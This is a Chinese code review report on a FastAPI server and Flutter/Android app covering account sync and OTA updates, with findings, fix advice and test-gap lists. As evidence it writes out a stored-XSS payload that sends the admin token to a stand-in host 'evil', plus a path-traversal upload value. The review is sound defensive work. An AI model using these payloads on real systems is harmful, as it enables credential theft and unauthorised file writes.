# PC 服务端 + App 联网同步/OTA —— 独立代码评审报告

- 评审日期：2026-10-01
- 评审范围：`server/app`（FastAPI + sqlite3）、App 联网/同步/OTA 相关 Dart 与 Android Kotlin、两端测试；对照 `spec.md`（FR-1~FR-16、NFR、API 契约、AC-1~AC-15）与 `tasks.md`
- 评审方式：只读走查 + 动态实证（TestClient 复现、服务端测试一键脚本、OH 3.22 `flutter analyze`、标准版 Flutter 3.47.5 `flutter test`、APK 构建产物核对）
- 依赖核对：`server/requirements.txt` 本批**未改动**（零新增 pip 依赖 ✅）；`app/pubspec.yaml` 仅 `0.1.0+1 → 0.4.0+4`，零新增 Dart 依赖 ✅；全仓无 `Color.withValues` 调用 ✅；Dart SDK 约束仍为 `>=3.4.0 <4.0.0` ✅

---

## ① 结论摘要

**结论：需修复后发布。**

功能完整度高：账号/目录/订阅/发布/OTA 的契约在正常路径上全部打通，服务端 7 个测试模块全部通过、App 83 个测试全部通过、debug APK 构建成功、live 脚本 34 项全过。但存在 **1 个已实证的严重安全隔离缺陷（上传路径穿越）**，以及若干会造成真实数据/可用性事故的问题（非法版本号可使全员 OTA 检查 500、离线退订被同步"复活"、原生下载并发竞态、强制更新可取消、管理台存储型 XSS）。这些问题集中在异常路径与管理端输入校验，修复量均不大，建议修完严重/重要项后再发布；建议项可排期跟进。

实测复现命令（venv `Python 3.10.11` + 临时 `MLL_DATA_DIR`）关键结果：

- 上传 `platform="../../../trev"` → 文件写到数据目录之外（`%TEMP%\trev-0.4.1-7-<ts>.apk`），接口返回 200。
- 上传 `version="oops"` 后，`GET /releases/latest` 对**所有** current 均返回 500；`current=abc`、`current=0.4.1+abc` 同样 500。
- 恶意 `device_id='"><onerror...>'` 原样落库，管理台 HTML 在单引号属性中渲染。
- CORS 预检：任意 Origin + `X-Admin-Token` 均被放行（`ACAO: *`）。
- `server/tests/run_all.py`：7/7 PASS；`flutter test`：83/83 PASS；OH fork 3.22 `flutter analyze`：0 error / 1 warning / 27 info（info 均为允许保留的 `withOpacity`）。

问题计数：**严重 1，重要 8，建议 15**。

---

## ② 问题清单

### 严重（阻断发布）

#### S1. APK 上传落盘文件名存在路径穿越，突破 releases 目录隔离

- **证据**：[routes_releases.py:46-47](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L46-L47)
  `safe_name = f"{platform}-{version}-{buildNo}-{int(time.time())}.apk"`，`platform`/`version` 来自 multipart 表单，仅 `strip()`，未做字符白名单或路径净化；`dest = settings.releases_dir / safe_name` 直接拼接。下载/删除同样用库里的 filename 拼接（[routes_releases.py:110-117](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L110-L117)、[routes_releases.py:81](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L81)）。
- **影响**：违反 NFR-4「上传文件……落目录隔离」。持有 Admin Token 者可让服务端在数据目录之外任意位置写入 `.apk` 后缀文件（实证已写到 `%TEMP%` 根），并可经下载路由读取、经删除路由删除该逃逸文件；配合下面 I6 的 XSS 可形成"普通设备→管理员浏览器→服务端文件系统"的利用链。
- **复现/推理**：`POST /api/v1/admin/releases`，multipart 中 `platform="../../../trev"`，文件任意 → 200，文件实际落在 `<data_dir>/../trev-...apk`；`../` 数量足够时可指向盘内任意已存在目录。
- **建议修法**：对 `platform`/`channel` 做枚举白名单（`android|ohos`、`stable|beta`），对 `version` 做 semver 正则（见 I1）；落盘文件名一律由服务端生成的安全 ID 构成（如 `f"{uuid4().hex}.apk"` 或对各字段做 `re.sub(r'[^A-Za-z0-9._-]', '_', ...)`），并在写盘前 `dest.resolve().is_relative_to(releases_dir.resolve())` 断言；DB 只存安全 basename。

---

### 重要（发布前应修复）

#### I1. 版本号无入库校验且比较函数不容错，一条脏数据可让全员更新检查 500

- **证据**：[db.py:882-892](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L882-L892)（`parse_version` 对非数字段直接 `int()`，可能抛 `ValueError`）、[db.py:895-906](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L895-L906)（`latest_release` 对每行调用 `parse_version`）、[db.py:909-919](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L909-L919)、[routes_releases.py:40-42](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L40-L42)（version 仅校验非空）、[routes_releases.py:88-94](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L88-L94)（异常未捕获）。
- **影响**：实证——管理台上传时 version 文本框手滑填 `oops`（接口 200 接收），此后 `GET /releases/latest` 在排序阶段即抛异常，**对所有 App、所有 current 返回 500**，OTA 通道整体瘫痪，只能手工修库；公开接口 `current=abc` / `0.4.1+abc` 也稳定 500（应为 422 或 `has_update:false`）。App 自动检查静默失败，事故不可见。
- **建议修法**：上传时以正则校验 semver（`^\d+\.\d+\.\d+$`，buildNo ≥ 0、platform/channel 白名单），非法返回 422；`parse_version` 改为不抛异常（非法段按 0 处理或返回 None），`latest` 路由捕获解析失败返回 422；脏行在 `latest_release` 中跳过并记日志。

#### I2. 离线退订会在对账时被"复活"，并集合并只实现了新增方向、删除方向无补偿

- **证据**：[synced_library_repository.dart:39-56](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_library_repository.dart#L39-L56)（DELETE 失败仅置一个布尔 dirty）、[synced_library_repository.dart:61-91](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_library_repository.dart#L61-L91)（sync 仅把 local-only 项 PUT 上去，从不重放 DELETE；合并 map 先装 remote 再 `putIfAbsent` local）。
- **推理**：断网退订 B：本地已移除、DELETE 未达服务端；恢复后 `syncSubscriptions()` 中 B ∈ remoteIds、∉ localIds → B 被 remote 元数据装回 merged 并 `replaceSubscriptions`，**退订被静默撤销**，dirty 也被清掉。跨设备同理会复活：A 机在线退订（服务端已删），B 机本地仍有 → 下次 sync B 把它 PUT 回去。`subscriptions.dirty` 是单布尔而非操作队列，[synced_library_repository.dart:51](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_library_repository.dart#L51) 任一次操作成功都会清掉它，无法表达待补偿的删除。
- **影响**：FR-11「以服务端列表为准做对账合并」的删除语义不成立；用户反复退订的播客可能反复回来。
- **建议修法**：KV 维护待同步操作队列（id + 动作 + 时间戳），sync 时先重放队列（PUT/DELETE）再拉取对账；或按 `content_version`/时间戳做三方比较；至少保证"本地已删除且删除请求未确认"的项在一次 sync 中重放 DELETE 后再决定是否接纳 remote。补充对应单测（当前测试只覆盖订阅方向，见④）。

#### I3. 原生下载插件重试/取消存在并发竞态，可双线程同写 .part 导致 APK 损坏

- **证据**：[MlUpdaterPlugin.kt:37-39](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt#L37-L39)（`cancelled`/`worker` 单实例共享）、[MlUpdaterPlugin.kt:71-86](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt#L71-L86)（每次 `onListen` 都 `cancelled=false` 并新起线程，旧线程不 join、不中断）、[MlUpdaterPlugin.kt:109-166](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt#L109-L166)（固定 `mll-update.apk.part`，`outputStream()` 总是截断重写；finally 里 `if (cancelled) target.delete()`）。
- **推理**：Dart 侧失败后点「重试」会先 cancel 旧订阅（`onCancel→cancelled=true`）再新 listen（`start→cancelled=false`），旧 worker 若仍在 read 循环会读到 false 继续下载——两个线程同时写同一 `.part`、各自 rename、各自 `endOfStream`/拉起安装器；旧线程也可能在 finally 用新的 `cancelled=false` 判定不删文件，或在时间窗内删掉新线程正在写的 target。取消后立即重试同理。
- **影响**：弱网下点重试可能得到损坏 APK（系统安装器报解析失败）或重复安装弹窗，排查困难。
- **建议修法**：每次下载生成独立 token/线程对象，`cancelled` 随会话走（`@Volatile var session: Long` 或局部标志）；`start` 前先中断并 join 旧 worker；目标文件按 release id 或会话 id 隔离；`onCancel` 只取消当前会话。

#### I4. mandatory 强制更新在下载阶段仍可取消/失败后可关闭，强制约束被绕过

- **证据**：[update_flow.dart:299-321](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/update/update_flow.dart#L299-L321)——出错时 actions 为「取消（pop 关闭对话框）+ 重试」，下载中为「取消下载」，均未判断 `widget.release.mandatory`；弹窗本身的不可取消仅在提示框做了（[update_flow.dart:83-86](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/update/update_flow.dart#L83-L86)、[update_flow.dart:110-114](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/update/update_flow.dart#L110-L114)）。
- **影响**：用户确认强制更新后，在下载中点「取消下载」、或遇失败点「取消」即可回到旧版 App 正常使用，FR-15「强制」语义只在提示框成立；下次启动虽会再弹（mandatory 不节流，已核对），但本次会话完全可用旧版。
- **建议修法**：mandatory 时隐藏「取消下载/取消」，仅保留「重试」（重试时自动重启下载）；失败态禁止 pop；可加「退出 App」按钮替代关闭。

#### I5. 401/403/404/409 的中文映射被服务端英文 detail 绕过，用户可见英文报错

- **证据**：[deps.py:22-30](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/deps.py#L22-L30)（`missing bearer token`/`invalid token`/`user not found`/`account disabled` 均英文）、[routes_me.py:15,32](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_me.py#L15-L32)、[routes_catalog.py:56,64](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_catalog.py#L56-L64)（英文 detail）；App 侧 [ml_api.dart:335-344](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/remote/ml_api.dart#L335-L344) 采用 `detail ?? 中文兜底`，优先显示服务端原文。
- **影响**：旧 token 过期、账号在别处被禁用等真实场景（订阅、/me、quota 请求 401/403）会把 `invalid token`、`account disabled` 这类英文串直接弹给中文用户，与任务书「401/403/404/409/422 的中文错误映射」不符（422 已固定中文，登录/注册接口本身也是中文，问题仅出在鉴权依赖与资源接口）。
- **建议修法**：二选一或叠加——① 服务端这些 `HTTPException` 的 detail 直接用中文；② App 对 401/403 在认证类路径上忽略 detail 使用固定中文（或服务端用错误码字段，App 按码映射）。

#### I6. 管理台存在存储型 XSS：device_id 无字符约束 + HTML 单引号属性未转义

- **证据**：[models.py:5](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/models.py#L5)（device_id 仅 1~128 长度）；管理台渲染 [index.html:260](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/static/admin/index.html#L260) `'<tr><td title=\'' + esc(u.id) + "'>"`，而 [esc() 定义在 index.html:231-235](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/static/admin/index.html#L231-L235) 只替换 `& < > "`，**不替换单引号**。
- **推理**：任意人可调 `/auth/device`，把 device_id 设为 `' onmouseover='fetch("http://evil/?t="+localStorage.mll_admin_token)' x='`（无需尖括号）；管理员打开「用户管理」并悬停该行即在 `/admin` 源执行任意 JS，可读 localStorage 中的 `X-Admin-Token` 并代管理员发起任意操作（发布恶意 APK、禁用用户）。已实证载荷原样落库并在用户列表 API 返回。
- **建议修法**：`esc` 同时替换 `' → &#39;`（并检查所有属性统一用双引号）；服务端对 device_id 加字符白名单（如 `[A-Za-z09._:-]{1,128}`）；可再给管理台响应加 `Content-Security-Policy`（无外网资源，CSP 成本很低）。

#### I7. App 下载不使用断点续传，152MB 弱网失败后从零重下

- **证据**：[MlUpdaterPlugin.kt:116-129](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt#L116-L129)——未发 `Range` 头，`target.outputStream()` 截断打开；`.part` 仅承担"完成前改名"，不承担续传。服务端 Range/206 已实测可用（[test_releases.py:120-125](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/tests/test_releases.py#L120-L125)）但客户端从不使用。
- **影响**：真机移动网络下 152MB 下载在 99% 失败也要全部重来，且 readTimeout 30s 无活动即判失败（[MlUpdaterPlugin.kt:117-118](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt#L117-L118)），OTA 成功率与体验受损；FR-14 明确提供了 Range 能力，端侧未对接。
- **建议修法**：重试时若 `.part` 存在则带 `Range: bytes=<len>-`（206 追加、200 截断重下），并用最终 `Content-Range`/总大小校验；结合 I3 的会话隔离一并实现。

#### I8. 已禁用用户持旧 JWT 启动时，App 把 403 当离线处理，界面保留登录态且无提示

- **证据**：[synced_auth_repository.dart:70-94](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_auth_repository.dart#L70-L94)——只对 `statusCode == 401` 清 token 降级游客，403 落入通用 catch「信任缓存会话」。服务端拦截本身正确（[deps.py:29-30](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/deps.py#L29-L30)，已实测旧 token 403）。
- **影响**：被禁用账号在 App 里仍显示已登录身份，订阅同步/配额等全部静默失败（叠加 I2 的 catch），用户得不到「账号已禁用」反馈，与 FR-2/AC-13 的错误可见性预期不符；用户只能手动点「退出」自救。
- **建议修法**：`ensureSession` 对 403 走与 401 类似的失效处理（清 token、降级游客或保留登录态但给出禁用提示位），至少把该状态暴露给 UI。

---

### 建议（不阻断发布，排期修复）

- **B1. analyze 存在 1 个 warning，AC-12「0 warning」字面未达标**：[synced_repositories_test.dart:311](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/test/synced_repositories_test.dart#L311) `final (repo, _, kv) = await build();` 中 `repo` 未使用。27 条 info 均为允许保留的 `withOpacity`，0 error。修法：改为 `(_, api2, kv)` 风格解构或加 ignore。
- **B2. `isNewerVersion` 为生产死代码，且与服务端 tie-break 语义不一致**：[version_utils.dart:50-63](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/core/version_utils.dart#L50-L63) 全仓仅被本文件测试引用；OTA 判定完全以服务端 `has_update` 为准（[update_flow.dart:30](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/update/update_flow.dart#L30)）。同版本、current 无 `+build` 时 App 判「有更新」（rb>0），服务端判「无更新」（[db.py:916-918](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L916-L918)，已被 test_releases 固化）。当前 App 固定发送 `0.4.0+4`（[constants.dart:20](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/core/constants.dart#L20)）暂不触发，但建议删除死代码或统一两端语义。
- **B3. CORS 全通配并放行自定义管理头**：[main.py:45-50](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/main.py#L45-L50)，实证任意 Origin 的预检都返回 `ACAO: * / ACAH: x-admin-token`。管理接口虽仍需 token，但结合 I6 风险被放大。建议按部署配置收敛 Origin（默认本机/局域网段），生产用环境变量控制。
- **B4. 下载产物未做 SHA-256 校验，且默认明文 HTTP**：`ReleaseInfo.sha256` 仅解析不使用（[ml_api.dart:66-97](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/remote/ml_api.dart#L66-L97)，Kotlin 侧也无校验）。AC-10 目前靠 adb 外部人工哈希。建议在 rename 前于插件内计算 sha256 并与下发值比对，不一致报错误删文件，防御明文链路/代理篡改。
- **B5. 搜索子集可能被缓存成"全量目录"，且缓存无时间戳/版本失效**：[fallback_catalog_repository.dart:42-57](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/fallback_catalog_repository.dart#L42-L57)——首网动作若是 search（非空且无缓存时直接 `_cachePodcasts(remote)` 的路径虽有 `cache==null` 守卫，但 featured 之外仍可能只缓存命中子集），离线 featured 只得到子集；缓存 key 无时间戳（tasks Task 10 要求带时间戳），`content_version` App 端完全未使用，缓存只能被后续成功覆盖，不会因服务端版本变化而失效。建议只缓存 featured 全量结果；缓存加 ts + content_version。
- **B6. 注册 check-then-insert 存在 TOCTOU**：[routes_auth.py:44-46](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_auth.py#L44-L46) 并发同邮箱注册可能触发 UNIQUE `IntegrityError` → 500 而非 409。建议捕获 sqlite3.IntegrityError 转 409。
- **B7. featured 静默截断 100 条**：[ml_api.dart:190-210](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/remote/ml_api.dart#L190-L210) `size=100` 且不翻页，服务端上限 200；目录超过 100 条时离线/在线都看不到尾部。建议 size=200 或循环翻页。
- **B8. 已下架播客仍出现在订阅列表**：[db.py:782-790](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L782-L790) JOIN 未加 `p.published=1`。FR-10 只规定 PUT 返回 404，但 GET 结果里继续暴露下架内容、App 端点进去单集 404，体验不一致。建议列表过滤 published，或返回时带 published 让 App 隐藏。
- **B9. 发布上传的其他健壮性缺口**：[routes_releases.py:38-58](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py#L38-L58) platform/channel 无白名单；失败时半成品文件不清理；无大小上限（磁盘耗尽型 DoS，管理端）；`buildNo` 允许负数（`int=Form(...)` 无约束）。建议随 I1 一并加校验与 finally 清理。
- **B10. 资料库页未接下拉/进入对账**：FR-11/Task 11 计划「library 页 build/下拉时触发」，实际仅在启动（[main.dart:86-88](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/main.dart#L86-L88)）和登录成功后（[profile_page.dart:357-362](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/auth/profile_page.dart#L357-L362)）同步；[library_page.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/library/library_page.dart) 订阅 Tab 无 RefreshIndicator。同一会话网络恢复后需重启 App 才能对账。
- **B11. JWT 缺 `sub` 时 500**：[deps.py:26](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/deps.py#L26) `payload["sub"]` 对同密钥但畸形的 token 抛 KeyError → 500，建议 `payload.get("sub")` 缺失即 401。
- **B12. 管理台功能完整度低于 FR-7 描述**：[index.html](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/static/admin/index.html) 播客只有下架无上架按钮、无编辑表单；单集靠 prompt 增删且音频 URL 硬编码 `/media/sample.mp3`，无法维护 artwork/音频地址/时长/发布日期。API 能力齐备，仅运营 UI 不完整。
- **B13. 搜索 LIKE 通配符未转义**：[db.py:572-575](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py#L572-L575) 用户输入 `%`/`_` 会被当通配符（无注入风险，仅搜索语义偏差）。
- **B14. 管理员改名无长度限制**：[routes_admin.py:33-34](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_admin.py#L33-L34) `str(body["name"])` 未限长（注册接口限 64），可写入超长昵称。
- **B15. 运行时数据目录未被 git 忽略**：`.gitignore` 未排除 `server/data/`，当前工作树中该目录含 152,158,299 字节的 APK 与含 E2E 账号的 `mll.db`（`git status` 均为 untracked），误 `git add .` 会带入大文件与用户数据。建议新增 `server/data/` 忽略规则。

---

## ③ 契约一致性核对表

| # | 契约项 | 结论 | 证据 / 备注 |
|---|---|---|---|
| 1 | 业务接口统一 `/api/v1` 前缀 | ✅ | 所有路由 prefix 核对一致；App 全部路径带 `/api/v1`（[ml_api.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/remote/ml_api.dart)） |
| 2 | `POST /auth/device` → token+is_guest | ✅ | routes_auth、test_auth 验证 |
| 3 | `POST /auth/register`（409/400/422）→ TokenOut+account | ✅ | 并发竞态见 B6 |
| 4 | `POST /auth/register|login` 响应结构 | ✅ | App `_auth` 解析 access_token/is_guest/account |
| 5 | `POST /auth/login` 401/403 | ✅ | 错密/未注册 401、禁用 403，实证测试覆盖 |
| 6 | `GET /me` | ✅ | 无/坏 token 401、禁用 403（英文 detail 见 I5） |
| 7 | 管理员 `X-Admin-Token`，错/缺 401 | ✅ | compare_digest 常量比较；无 timing 裸比较 |
| 8 | `GET/PATCH /admin/users[...]`、订阅查看 | ✅ | 含 subscription_count；重置密码 ≥6 校验 422 |
| 9 | `GET /catalog/meta`（7 语言/3 难度/content_version） | ✅ | test_catalog |
| 10 | `GET /catalog/podcasts` q/language/level/分页 | ✅ | 参数化 SQL；大小 1..200 钳制；LIKE 通配符见 B13 |
| 11 | 目录输出 camelCase（feedUrl/artworkUrl/durationMs/pubDate/podcastId） | ✅ | podcast_out/episode_out 与 App fromJson 完全对齐；管理入参两种写法皆收 |
| 12 | 下架内容公开接口不可见 | ✅ | 列表/详情/单集均过滤；订阅列表例外见 B8 |
| 13 | `GET /catalog/podcasts/{id}/episodes` | ✅ | App 解析、相对 URL 补水 |
| 14 | 播客/单集管理 CRUD + reseed | ✅ API / ⚠️ UI | API 齐；管理台 UI 仅最小闭环（B12） |
| 15 | `/media/sample.mp3` 可播放且与资产一致 | ✅ | 字节级比对测试通过 |
| 16 | `GET/PUT/DELETE /me/subscriptions`（204/404/幂等） | ✅ | PUT 不存在/下架 404；DELETE 恒 204 |
| 17 | App 订阅乐观更新+失败标记 | ✅ 机制 / ⚠️ 语义 | 布尔 dirty；删除补偿缺失见 I2 |
| 18 | sync 并集合并+回推 | ⚠️ | 只回推新增、不回退删除（I2） |
| 19 | 发现页联网优先→缓存→内置 | ✅ | 三级回退顺序正确；缓存细节见 B5 |
| 20 | 350ms 防抖搜索沿用 | ✅ | discover_page Timer 350ms 保留 |
| 21 | 相对 URL 绝对化 | ✅ | `absoluteUrl` 处理 `/media`、去尾斜杠、绝对/特殊 scheme 透传，单测覆盖 |
| 22 | query 编码 | ✅ | dio 统一编码（中文 q 无专门单测，见④） |
| 23 | `POST /admin/releases` multipart（file+platform+version+buildNo+channel+notes+mandatory） | ⚠️ | 字段名 App 管理台与服务端一致（buildNo）；但缺校验导致 S1/I1/B9 |
| 24 | 服务端计算 size/SHA-256 落盘 | ✅ | 1MB 分块流式（非整文件读内存），live 152MB 哈希一致 |
| 25 | 发布输出 snake_case（has_update/build_no/published_at/url） | ✅ | 仅无更新时返回 `{has_update:false}` 与契约一致；App ReleaseInfo 兼容 snake/camel |
| 26 | `GET /releases/latest` 版本+构建号比较 | ⚠️ | 正常路径正确（含 +build tie-break，实测）；非法输入/脏行 500（I1）；无 build 后缀两端语义不同（B2） |
| 27 | current 形如 `0.4.0+4` | ✅ | Env.appVersionWithBuild 常量与 pubspec `0.4.0+4` 一致 |
| 28 | 下载 Range/206 + 存在性 404 | ✅ | 服务端实测 206/Content-Range/Accept-Ranges；客户端未用 Range（I7） |
| 29 | App 启动异步检查、24h 节流、强制例外 | ✅ | home_shell 逻辑核对正确；mandatory 每次启动可再弹 |
| 30 | 我的页手动检查更新/已是最新提示 | ✅ | widget 测试覆盖 |
| 31 | 弹窗说明/进度/失败重试 | ✅ 常规 / ⚠️ 强制 | 进度与失败态具备；mandatory 可逃离见 I4 |
| 32 | FileProvider 调起安装器 + Android O+ 安装权限 | ✅ 安全配置 | REQUEST_INSTALL_PACKAGES、canRequestPackageInstalls 前置引导设置；needPermission 事件回到 UI |
| 33 | FileProvider 导出安全 | ✅ | exported=false、grantUriPermissions=true、固定单文件 URI 忽略路径、只读 MODE，无路径暴露面 |
| 34 | 不支持平台手动提示 | ✅ | MissingPlugin/Unimplemented/PlatformException 三类识别，widget 测试覆盖 |
| 35 | 401/403/404/409/422 中文错误映射 | ⚠️ | 传输类/422/登录接口中文完整；依赖注入层英文 detail 会透传（I5） |
| 36 | 网络超时（连接≤5s）与异常回退 | ✅ | connect 5s/receive 10s；发现/订阅/更新三类均不崩 |
| 37 | JWT 生成/校验 | ✅ | HS256+exp，jose 解码失败 401；畸形 payload 见 B11 |
| 38 | PBKDF2 加盐哈希 | ✅ | sha256/200k/16B salt/`pbkdf2$iters$salt$hash`，compare_digest，测试覆盖 |
| 39 | SQL 全参数化、无注入面 | ✅ | 动态片段仅白名单列名/常量 WHERE；q 走绑定参数 |
| 40 | CORS | ⚠️ | 全通配+全头放行（B3） |
| 41 | 零新增 pip/Dart 依赖、SDK 与 withValues 约束 | ✅ | requirements 未改、pubspec 仅版本号、全仓无 withValues |
| 42 | dio 拦截器递归风险 | ✅ | 仅一个注入 Bearer 的请求拦截器，无 401 refresh 循环 |
| 43 | `.part→rename` | ✅ | rename 失败有 copyTo 兜底；无续传见 I7；并发见 I3 |
| 44 | progress 节流 | ✅ | Native 250ms + 完成帧补发 |
| 45 | StreamSubscription/Timer 释放 | ✅ | 下载对话框 dispose cancel；发现页 debounce cancel；home_shell 无常驻定时器 |
| 46 | SQLite 连接关闭/WAL/外键 | ✅ | 每操作短连接 finally close；每次连接 PRAGMA WAL+foreign_keys=ON（级联删除实证） |
| 47 | 大文件上传内存路径 | ✅ | UploadFile 1MB 分块循环，不整文件驻留；152,158,299 字节 live 通过 |

---

## ④ 测试覆盖缺口清单

### 服务端（现有 6 个 test_* + smoke，覆盖扎实，以下为缺口）

1. 上传文件名字段（platform/version）净化——**S1 无任何测试拦截**；建议加路径穿越用例断言落盘文件必须位于 releases_dir 内。
2. version/platform/channel/buildNo 非法值的 422——I1 缺口（当前只测了 .apk 扩展名）。
3. `/releases/latest?current=<非法串>` 的容错（应 200 false 或 422，当前 500）。
4. 并发同邮箱注册的 409（B6）。
5. 下架播客与 `GET /me/subscriptions` 的期望行为（B8 目前无定义性测试）。
6. reseed 级联删除订阅的断言（实现依赖每条连接 `foreign_keys=ON`，值得一条用例固化）。
7. CORS 策略用例（若按 B3 收敛）。
8. 管理台 XSS 转义：`esc` 对单引号与 device_id 白名单（I6）。

### App（现有 4 个新文件 35 个用例，以下为缺口/假阳性点）

9. **离线退订→sync 不复活**：最关键的数据一致性分支缺失；现有 FakeApi 记录了 `unsubscribedIds` 但 sync 流程从不校验 DELETE 补偿，因此测试通过不能证明删除收敛（I2 的直接原因）。
10. 下载对话框的失败态/「重试」/「取消下载」分支无 widget 测试；mandatory 失败态可关闭也无断言（I4）。
11. Fake 与真实行为偏离：`FakeApi extends MlApi` 重写了全部业务方法（[synced_repositories_test.dart:39-122](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/test/synced_repositories_test.dart#L39-L122)），**完全绕开 dio 拦截器与 JSON 序列化**——Authorization 头注入、query 编码（中文/空格）、snake/camel 真实接线、超时类型均无测试；ml_api_test 的 FakeAdapter 更接近真实，建议 repository 层也尽量走 adapter 注入。
12. `ensureSession` 对 403（禁用）的行为无测试（I8）；403→中文消息映射无测试。
13. 搜索缓存子集污染、缓存时间戳/content_version 失效无测试（B5）。
14. 24h 节流与 mandatory 例外无测试（home_shell 纯时间逻辑，可注入时钟做纯单测）。
15. `featured` 超过 100 条的截断行为无测试（B7）。
16. `absoluteUrl` 已覆盖；但 podcastId 路径段未做 URL encode（当前 id 为 hex/p1..p8 安全，属潜在缺口，建议补 encode 并用测试固化）。
17. 质量门禁：修复 B1 的 unused_local_variable 后重新保留 0 warning 证据；建议在 CI 同时记录 OH 3.22 与 3.47 双工具链 analyze 输出。

---

## ⑤ 与 spec AC 的映射结论

| AC | 结论 | 依据 |
|---|---|---|
| AC-1 持久化与播种 | ✅ | test_db_seed 全过；表/8 播客/16 单集/媒体字节一致/重复 init 幂等，本次复跑通过 |
| AC-2 注册登录鉴权 | ✅ | test_auth 全分支（含 pbkdf2 前缀、禁用 403、旧 token 403） |
| AC-3 管理员接口 | ✅ | test_admin/test_subscriptions（错/缺 token 401、计数、重置密码） |
| AC-4 目录筛选搜索 | ✅ | coffee/ja/beginner/分页/下架/reseed 全部断言通过 |
| AC-5 订阅接口 | ✅ | 幂等/404/204/管理员查看全过；端侧删除收敛问题见 I2（属 FR-11 范畴） |
| AC-6 发布与版本比较 | ✅（API） | 401/400/200、size/sha、206/哈希一致；非法输入缺口 I1 不影响已测正常路径 |
| AC-7 管理台可用 | ⚠️ | TestClient 断言（四区标记、无外网资源）通过；**浏览器自动化实际登录并完成发布的截图证据未在仓库中找到**；且存在 I6 XSS、B12 UI 不完整 |
| AC-8 发现联网优先/离线回退 | ✅ | 单测三级回退齐全；live 日志「搜索命中独家内容 items=2」；截图 01-25 为通用页面，专属在线/离线对比证据偏弱 |
| AC-9 注册登录多端一致 | ✅ | live 日志含「重装后重新登录」「订阅服务端仍在 (p1+独家)」；并集策略保证新增收敛（删除例外 I2） |
| AC-10 OTA 全链路 | ⚠️ | 服务端侧（版本判定/206/152MB sha256 一致）证据充分；App 侧弹窗/进度有 widget 测试；**设备上下载完成→安装器唤起的截图/录屏、设备端哈希输出未在 `.tools/app-shots` 找到**；且 I3/I4/I7 是真机链路风险点 |
| AC-11 一键测试回归 | ✅ | 本次实跑 `run_all.py` 7/7 PASS（含 smoke_test） |
| AC-12 App 质量门禁 | ⚠️ | 0 error ✅、83/83 测试通过 ✅、debug APK 构建成功 ✅（`.tools_build_out.txt`）；存在 1 个 warning（B1），字面不满足「0 warning」 |
| AC-13 异常安全 | ✅（大体） | 发现回退/登录中文报错/订阅保留/更新静默均有实现与测试；403 透传英文（I5）、禁用 403 无提示（I8）为减分项 |
| AC-14 双端兼容与代码质量（rubric，阈值≥4） | 4/5 | 分层复用（Provider/repository 包装、页面零改动）、零新依赖、中文注释、OH 3.22 analyze 0 error 均达成；扣分点：I2/I3 两个并发/一致性缺陷、测试 Fake 偏离真实链路、B1 warning |
| AC-15 E2E 完成度（rubric，阈值≥4） | 3~4/5 | live API 脚本 34 项全过、真机构建成功；但管理台浏览器自动化与 OTA 真机安装器证据未见归档，证据链不完整，建议补齐截图后可稳达 4 |

